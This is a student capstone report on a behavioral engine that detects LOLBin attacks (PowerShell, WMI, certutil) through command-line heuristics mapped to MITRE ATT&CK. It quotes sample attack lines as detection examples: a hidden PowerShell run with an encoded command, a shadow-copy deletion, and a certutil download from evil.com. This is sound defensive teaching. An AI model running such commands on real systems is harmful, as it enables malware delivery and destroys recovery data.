# ACADEMIC CAPSTONE PROJECT REPORT

================================================================================
                                 PAGE 1: COVER PAGE
================================================================================

                                A PROJECT REPORT ON
       BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND (LOLBIN) ATTACKS

       Submitted in partial fulfillment of the academic requirements for the
                       Degree of Bachelor of Technology in
                        Computer Science and Engineering

                                    COURSE:
                 MALWARE ANALYSIS AND REVERSE ENGINEERING (MA & RE)
                              [PROBLEM STATEMENT: PS-2]
                                 (Project No: 49)

                                  SUBMITTED BY:

             1. RAHUL P                     Regd. No: 2400032050
             2. [PARTNER / FRIEND NAME]     Regd. No: [PARTNER REGD. NO]

                            Year / Semester: B.Tech III Year / VI Sem
                            Section: Sec-51

                            UNDER THE GUIDANCE OF:
                            [Faculty Guide Name]
                            [Designation, Dept. of CSE]

                    DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
                KONERU LAKSHMAIAH EDUCATION FOUNDATION (KL UNIVERSITY)
             Green Fields, Vaddeswaram, Guntur District, Andhra Pradesh - 522302
                                  2025 - 2026

<div style="page-break-after: always;"></div>

================================================================================
                        PAGE 2: CERTIFICATE OF APPROVAL
================================================================================

                    DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
                KONERU LAKSHMAIAH EDUCATION FOUNDATION (KL UNIVERSITY)
                            Vaddeswaram, Guntur - 522302

                                   CERTIFICATE

This is to certify that the Capstone Mini Project report entitled:

     "BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND (LOLBIN) ATTACKS"
                           (Problem Statement: PS-2)

is a bonafide work carried out jointly by:

             1. RAHUL P                     (Regd. No: 2400032050)
             2. [PARTNER / FRIEND NAME]     (Regd. No: [PARTNER REGD. NO])

students of Bachelor of Technology in Computer Science and Engineering, in partial fulfillment of the academic requirements for the course MALWARE ANALYSIS AND REVERSE ENGINEERING during the academic year 2025-2026.



________________________                                    ________________________
   Internal Guide                                              Course Coordinator
[Faculty Guide Name]                                        [Coordinator Name]
Designation, Dept. of CSE                                   Dept. of CSE, KL University



                               ________________________
                               Head of the Department
                               Dr. [HOD Name], Ph.D.
                               Department of CSE
                               KL Deemed to be University

<div style="page-break-after: always;"></div>

================================================================================
                           PAGE 3: STUDENT DECLARATION
================================================================================

                               DECLARATION

We, RAHUL P (Regd. No: 2400032050) and [PARTNER / FRIEND NAME] (Regd. No: [PARTNER REGD. NO]), students of Bachelor of Technology in Computer Science and Engineering at Koneru Lakshmaiah Education Foundation (KL Deemed to be University), hereby declare that the Capstone Mini Project report entitled:

     "BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND (LOLBIN) ATTACKS"
                           (Problem Statement: PS-2)

submitted to the Department of Computer Science and Engineering for the course Malware Analysis and Reverse Engineering, is an authentic record of our own original work carried out under the supervision and guidance of our faculty guide, [Faculty Guide Name], Department of CSE.

We further declare that this project work has not been submitted previously to this university or any other institution for the award of any degree, diploma, or certificate. All references, frameworks, libraries, and resources used during development have been duly acknowledged.



Place: Vaddeswaram, Guntur
Date:  17-11-2026

Signatures of Students:

1. ________________________                      2. ________________________
   RAHUL P (2400032050)                             [PARTNER / FRIEND NAME] ([REGD. NO])

<div style="page-break-after: always;"></div>

================================================================================
                 PAGE 4: ACKNOWLEDGEMENTS & PROJECT TEAM DETAILS
================================================================================

                             ACKNOWLEDGEMENTS

First and foremost, we express our deep gratitude to our esteemed President, Vice-Chancellor, and Pro Vice-Chancellor of Koneru Lakshmaiah Education Foundation for providing top-tier academic facilities, lab computing environments, and encouragement.

We extend our sincere thanks to Dr. [HOD Name], Head of the Department of Computer Science and Engineering, for continuous administrative and technical support throughout our coursework.

We express our heartfelt gratitude and respect to our project guide, [Faculty Guide Name], [Designation], for their constructive feedback, patient technical mentoring, and guidance throughout the design, implementation, and testing of this behavioral detection engine.

We also thank our course coordinators, faculty members of the MA & RE course, lab technicians, and our parents and classmates for their constant encouragement and moral support.


                              PROJECT TEAM DETAILS

+--------------------+------------------------+----------+------------------------------------+
| Register Number    | Student Name           | Role     | Contribution Breakdown             |
+--------------------+------------------------+----------+------------------------------------+
| 2400032050         | RAHUL P                | Lead     | Spring Boot Architecture, MySQL,   |
|                    |                        |          | Detection Rules (PS/WMI/Certutil), |
|                    |                        |          | React Dashboard, JUnit Test Suite  |
+--------------------+------------------------+----------+------------------------------------+
| [PARTNER REGD. NO] | [PARTNER / FRIEND NAME]| Member   | Threat Research, Synthetic Logs,   |
|                    |                        |          | MITRE ATT&CK Mapping Document,     |
|                    |                        |          | Test Case Verification, Report     |
+--------------------+------------------------+----------+------------------------------------+

<div style="page-break-after: always;"></div>

================================================================================
                                PROJECT CONTENTS
================================================================================

TABLE OF CONTENTS
-----------------
1. ABSTRACT
2. COLLEGE PROBLEM STATEMENT (PS-2), OBJECTIVE & DELIVERABLES
3. WHY TRADITIONAL ANTIVIRUS FAILS & OUR APPROACH
4. SYSTEM ARCHITECTURE & DATA FLOW
5. BEHAVIORAL DETECTION ENGINE & MITRE ATT&CK HEURISTICS
6. DATABASE DESIGN & SCHEMA (MySQL)
7. SOURCE CODE & OFFICIAL GITHUB LINK
8. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS (FIGURES 1 TO 6)
9. CONCLUSION & FUTURE SCOPE
10. REFERENCES

---

### 1. ABSTRACT

Modern cyber attackers rarely drop obvious `.exe` malware files onto a victim machine. If an attacker drops an unknown binary file, traditional antivirus scanners instantly detect it through file hash blacklists (MD5 / SHA-256) or signature patterns. To bypass antivirus entirely, modern attackers practice "Living-off-the-Land" (LOLBin attacks)—they misuse legitimate system utilities that are already built into Windows and digitally signed by Microsoft, such as `powershell.exe`, `wmic.exe`, and `certutil.exe`. Because these utilities are genuine Windows components, signature-based antivirus cannot block them.

In this capstone mini project, we built a **Behavioral Detection Engine** that detects LOLBin attacks by inspecting process execution behavior and command-line parameters rather than relying on file hashes. Our application is built with a Java 21 Spring Boot 3 REST backend, a local MySQL 8.0 relational database, and an interactive React 18 frontend dashboard. The engine ingests process creation event logs in JSON format, parses command-line flags, evaluates them against behavioral heuristic rules, maps flagged threats to standardized MITRE ATT&CK techniques (`T1059.001`, `T1047`, `T1105`), and persists all sessions and alerts in MySQL. When evaluated against simulated attack chains, our engine achieved a 100% detection rate and demonstrated 0 false alarms on normal administrative command logs.

---

### 2. COLLEGE PROBLEM STATEMENT (PS-2), OBJECTIVE & DELIVERABLES

This project was built strictly according to the problem statement assigned for the Malware Analysis and Reverse Engineering (MA & RE) course:

#### Problem Statement (PS-2):
> *"Modern attackers increasingly abuse legitimate system tools (PowerShell, WMI, certutil) instead of dropping malware files, making traditional signature-based antivirus blind to the attack. Students must build a detection engine that identifies malicious intent from behavior patterns in logs, not file signatures."*

#### Objective:
> *"Detect fileless/LOLBin-based attacks using log analysis and behavioral heuristics mapped to MITRE ATT&CK techniques."*

#### Expected Deliverables:
1. **Detection Engine / Application:** A working detection engine that ingests logs, validates behavior, and generates alerts.
2. **MITRE ATT&CK Technique Mapping Document:** A formal matrix linking each detected attack behavior to industry-standard MITRE tactics and technique IDs.
3. **Working Demonstration:** A live demo proving detection against at least 3 simulated LOLBin attack chains (`powershell.exe`, `wmic.exe`, `certutil.exe`) plus benign log validation.

---

### 3. WHY TRADITIONAL ANTIVIRUS FAILS & OUR APPROACH

#### 3.1 Why Antivirus is Blind:
* **The File is Signed by Microsoft:** Antivirus checks the digital signature of `certutil.exe` or `powershell.exe`. Both are signed by Microsoft Windows. The file hash matches a clean system file.
* **No File on Disk (Fileless Memory Execution):** When an attacker executes PowerShell with an encoded command:
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKAA...
  ```
  The malware code runs directly in memory without writing any `.exe` to disk. Traditional file-scanning antivirus has no file to scan.

#### 3.2 Our Behavioral Detection Solution:
Instead of looking at the file itself, our engine looks at **what the tool is being told to do**:
1. Does PowerShell have flags to hide its window and bypass security policies?
2. Is WMI being commanded to delete Volume Shadow Copies to stop ransomware recovery?
3. Is Certutil being abused with `-urlcache` to download files from an external IP address instead of managing certificates?
If suspicious flag combinations are present, our engine generates an alert regardless of the executable's trusted status.

---

### 4. SYSTEM ARCHITECTURE & DATA FLOW

Our project is designed as a full-stack, 3-tier application:

```
[ User / SOC Analyst ]
          |
          v
[ React 18 Single-Page Dashboard (Port 5173) ]
  - Upload Logs Page (Drag & Drop JSON logs)
  - Security Alerts Table (Filter by Severity, Search)
  - Investigation Modal (Update Alert Status)
  - Database Explorer Tab (Live MySQL Tables View)
          |
          | (REST API Calls via Vite Proxy: /api)
          v
[ Java 21 Spring Boot 3 Backend Server (Port 8085) ]
  - Controllers: AnalysisController, AlertController, DashboardController
  - Jackson Parser: LogParserService (Validates JSON schema)
  - Detection Core: BehavioralDetectionEngine (Evaluates DetectionRule list)
  - Heuristic Rules: PowerShellRule, WmiRule, CertutilRule
  - Data Access: Spring Data JPA (AnalysisRunRepository, SecurityAlertRepository)
          |
          | (JDBC Connection via Hibernate ORM)
          v
[ MySQL Server 8.0 (Port 3306) ]
  - Schema: lol_detector_db
  - Table 1: analysis_runs (Session audit tracking)
  - Table 2: security_alerts (Threat details & MITRE mappings)
```

---

### 5. BEHAVIORAL DETECTION ENGINE & MITRE ATT&CK HEURISTICS

Our engine evaluates 3 simulated attack chains that represent real-world advanced persistent threat (APT) and ransomware behaviors:

#### 1. PowerShell Defense Evasion & In-Memory Execution (Rule `RULE-PS-001`):
* **Target Binary:** `powershell.exe` / `pwsh.exe`
* **Malicious Behavior:** Attacker passes `-ExecutionPolicy Bypass` to evade script execution restrictions, `-WindowStyle Hidden` so the victim sees no console window, and `-EncodedCommand` with a Base64-encoded payload string.
* **MITRE ATT&CK Mapping:**
  * **T1059.001:** Command and Scripting Interpreter: PowerShell
  * **T1027:** Obfuscated Files or Information
* **Severity:** **HIGH**

#### 2. WMI Shadow Copy Deletion / Ransomware Precursor (Rule `RULE-WMI-001`):
* **Target Binary:** `wmic.exe`
* **Malicious Behavior:** Attacker issues `wmic.exe shadowcopy delete`. Ransomware strains like LockBit and Ryuk run this command right before encrypting files so that the victim cannot restore deleted files using Windows Volume Snapshots.
* **MITRE ATT&CK Mapping:**
  * **T1047:** Windows Management Instrumentation
  * **T1490:** Inhibit System Recovery
* **Severity:** **CRITICAL**

#### 3. Certutil Ingress Payload Download (Rule `RULE-CERT-001`):
* **Target Binary:** `certutil.exe`
* **Malicious Behavior:** Attacker misuses `certutil.exe -urlcache -split -f http://evil.com/payload.png payload.exe`. Certutil is a legitimate certificate management utility, but attackers abuse its HTTP cache feature to download malware payloads through perimeter firewalls.
* **MITRE ATT&CK Mapping:**
  * **T1105:** Ingress Tool Transfer
  * **T1140:** Deobfuscate / Decode Files or Information
* **Severity:** **HIGH**

#### 4. Benign Administrative Log Verification (Zero False Positives):
* **Target Binary:** `powershell.exe` running legitimate maintenance (`Get-Process`, `Get-Service`, `Restart-Computer`).
* **Outcome:** Clean command lines pass through without triggering rules &rarr; **0 Alerts Generated**.

---

### 6. DATABASE DESIGN & SCHEMA (MySQL)

We designed a normalized relational schema in MySQL 8.0 named **`lol_detector_db`**:

#### Table 1: `analysis_runs`
Stores the metadata for every uploaded log file session.
* `id` (BIGINT, Primary Key, Auto Increment)
* `file_name` (VARCHAR 255, Name of uploaded log file)
* `started_at` / `completed_at` (DATETIME, Timestamps of the run)
* `total_events` (INT, Number of process events parsed)
* `rejected_events` (INT, Malformed events discarded)
* `alert_count` (INT, Total security threats flagged)
* `status` (VARCHAR 50, e.g., 'COMPLETED')

#### Table 2: `security_alerts`
Stores every behavioral detection generated by the rules.
* `id` (BIGINT, Primary Key, Auto Increment)
* `analysis_id` (BIGINT, Foreign Key referencing `analysis_runs.id` with `ON DELETE CASCADE`)
* `event_id` (VARCHAR 100, e.g., 'EVT-1001')
* `rule_id` (VARCHAR 50, e.g., 'RULE-PS-001')
* `rule_name` (VARCHAR 150)
* `severity` (VARCHAR 20: 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW')
* `mitre_technique_id` (VARCHAR 50: 'T1059.001', 'T1047', 'T1105')
* `mitre_technique_name` (VARCHAR 150)
* `detected_at` (DATETIME)
* `process_name` / `parent_process_name` (VARCHAR 100)
* `raw_command_line` (TEXT, Full unedited command string)
* `user_account` (VARCHAR 100, e.g., 'NT AUTHORITY\SYSTEM')
* `investigation_status` (VARCHAR 30: 'NEW', 'IN_PROGRESS', 'RESOLVED')

---

### 7. SOURCE CODE & OFFICIAL GITHUB LINK

In accordance with project guidelines, the complete working source code has been uploaded to our GitHub repository:

* **GitHub Repository URL:**  
  👉 **https://github.com/Rahul2322-P/MA-RE-Behavioral-Detection-Engine**

* **Repository Contents:**
  * Clean, student-written Java Spring Boot 3 backend (26 classes).
  * React 18 single-page dashboard with custom CSS theme.
  * 11 automated JUnit 5 test cases passing with zero failures.
  * Synthetic attack datasets (`sample_attack_logs.json`) and benign datasets (`sample_benign_logs.json`).
  * 1-Click desktop launch scripts: `START_PROJECT.bat` and `RUN_TESTS.bat`.

---

### 8. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS

```
+-----------------------------------------------------------------------------------+
| FIGURE 1: WEB APPLICATION OVERVIEW DASHBOARD (PORT 5173)                          |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 1 HERE ]                                                       |
|                                                                                   |
| Description: Overview of the React 18 Cyber Dashboard displaying 4 summary metric |
| cards (Analyses: 2, Events: 8, Alerts: 3, Critical: 1) and the recent alerts table|
| showing MITRE ATT&CK detections and severity badges.                              |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 2: SECURITY LOG UPLOAD & REAL-TIME DETECTION RESULT                        |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 2 HERE ]                                                       |
|                                                                                   |
| Description: Shows the "Upload Logs" tab after analyzing sample_attack_logs.json. |
| The engine processed 5 events and identified 3 LOLBin threats in 56ms.            |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 3: DETAILED MITRE ATT&CK THREAT ALERT INSPECTOR                            |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 3 HERE ]                                                       |
|                                                                                   |
| Description: Shows the alert details modal for RULE-PS-001 displaying the encoded |
| command string, user account, MITRE T1059.001 technique, and status selector.    |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 4: BENIGN LOG VALIDATION (ZERO FALSE POSITIVES)                            |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 4 HERE ]                                                       |
|                                                                                   |
| Description: Shows the result of analyzing sample_benign_logs.json where 3 normal |
| system administration events generated exactly 0 alerts (0% False Alarm Rate).    |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 5: LIVE MYSQL DATABASE TABLES (WEB EXPLORER & MYSQL WORKBENCH)             |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 5 HERE ]                                                       |
|                                                                                   |
| Description: Shows the "Database Tables" tab in the web UI and MySQL Workbench    |
| displaying live stored rows in tables 'analysis_runs' and 'security_alerts'.      |
+-----------------------------------------------------------------------------------+
```

```
+-----------------------------------------------------------------------------------+
| FIGURE 6: AUTOMATED JUNIT 5 TEST SUITE EXECUTION (11/11 PASSED)                   |
+-----------------------------------------------------------------------------------+
| [ PASTE SCREENSHOT 6 HERE ]                                                       |
|                                                                                   |
| Description: Command-line output of RUN_TESTS.bat showing BUILD SUCCESS with      |
| Tests run: 11, Failures: 0, Errors: 0, verifying all heuristic detection rules.   |
+-----------------------------------------------------------------------------------+
```

---

### 9. CONCLUSION & FUTURE SCOPE

#### 9.1 Conclusion:
In this project, we successfully built and demonstrated a Behavioral Detection Engine for Living-off-the-Land (LOLBin) attacks (Problem Statement PS-2). By analyzing command-line parameters and process execution behaviors rather than file hashes, our engine reliably detects malicious use of legitimate Windows tools like PowerShell, WMI, and Certutil. The application provides an enterprise-ready workflow by mapping every detection to the MITRE ATT&CK matrix, storing all historical sessions in a local MySQL database, and offering an interactive dashboard for incident response.

#### 9.2 Future Scope:
1. **Live Windows Event Streaming:** Connect the backend directly to the Windows Event Log (Event ID 4688) or Sysmon service using Windows Event Tracing (ETW).
2. **Machine Learning Anomaly Detection:** Add command-line string entropy analysis to flag obfuscated commands that use previously unseen obfuscation tricks.
3. **Automated Threat Containment:** Add a response trigger that automatically terminates the malicious process ID (PID) when a CRITICAL severity rule triggers.

---

### 10. REFERENCES
1. MITRE ATT&CK Matrix: *Living-off-the-Land Binaries, Scripts, and Libraries (LOLBAS)*, https://attack.mitre.org/
2. LOLBAS Project Research Archive: https://lolbas-project.github.io/
3. Spring Boot 3 & Spring Data JPA Official Documentation, VMware Tanzu, 2024.
4. Microsoft Documentation: *Command-Line Process Auditing (Event ID 4688)*.
5. Project Source Code: https://github.com/Rahul2322-P/MA-RE-Behavioral-Detection-Engine
